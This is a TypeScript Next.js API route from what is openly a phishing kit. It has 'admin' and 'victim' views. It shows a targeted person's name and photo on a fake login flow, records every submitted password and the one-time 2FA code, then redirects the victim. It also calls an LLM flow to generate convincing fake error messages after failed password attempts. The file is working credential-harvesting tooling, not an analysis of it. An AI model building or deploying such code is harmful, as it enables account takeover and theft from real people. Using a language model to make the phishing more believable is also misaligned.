import { NextRequest, NextResponse } from 'next/server';
import { appState, initialState } from '@/lib/state';
import { simulateErrorWithLLM } from '@/ai/flows/simulate-error';

export const dynamic = 'force-dynamic';

export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const view = searchParams.get('view');

  if (view === 'admin') {
    return NextResponse.json(appState);
  }

  if (view === 'victim') {
    return NextResponse.json({
      currentPage: appState.victim.currentPage,
      email: appState.victim.email,
      name: appState.victim.name,
      profilePicture: appState.victim.profilePicture,
      errorMessage: appState.victim.errorMessage,
      redirectUrl: appState.config.redirectUrl,
    });
  }

  return NextResponse.json({ error: 'Invalid view' }, { status: 400 });
}

export async function POST(request: NextRequest) {
  const body = await request.json();

  switch (body.action) {
    case 'setConfig':
      appState.config = body.config;
      // Reset victim state when new config is set
      Object.assign(appState.victim, initialState.victim);
      return NextResponse.json({ success: true, message: 'Configuration updated' });

    case 'setVictimPage':
      appState.victim.currentPage = body.page;
      return NextResponse.json({ success: true, message: `Victim page set to ${body.page}` });

    case 'submitEmail':
      if (body.email.toLowerCase() === appState.config.targetEmail.toLowerCase()) {
        appState.victim.email = body.email;
        appState.victim.name = appState.config.targetName;
        appState.victim.profilePicture = appState.config.targetProfilePicture;
        appState.victim.currentPage = 'password';
      } else {
        // Generic behavior for non-target emails
        appState.victim.email = body.email;
        appState.victim.name = 'Account';
        appState.victim.profilePicture = '';
        appState.victim.currentPage = 'password';
      }
      return NextResponse.json({ success: true });

    case 'submitPassword':
      appState.victim.passwords.push(body.password);
      appState.victim.attempts += 1;

      if (appState.victim.currentPage === 'password') {
        if (appState.victim.attempts >= 2) {
          try {
            const { errorMessage } = await simulateErrorWithLLM({ attempts: appState.victim.attempts });
            appState.victim.errorMessage = errorMessage;
            appState.victim.currentPage = 'error';
          } catch (error) {
            console.error("AI simulation failed:", error);
            appState.victim.errorMessage = "An unexpected error occurred. Please try again later.";
            appState.victim.currentPage = 'error';
          }
        }
      }
      return NextResponse.json({ success: true });
    
    case 'submitOtp':
      appState.victim.otp = body.otp;
      appState.victim.currentPage = 'redirect';
      return NextResponse.json({ success: true });

    case 'reset':
      Object.assign(appState.victim, initialState.victim);
      Object.assign(appState.config, initialState.config);
      return NextResponse.json({ success: true, message: 'State reset' });
      
    default:
      return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
  }
}
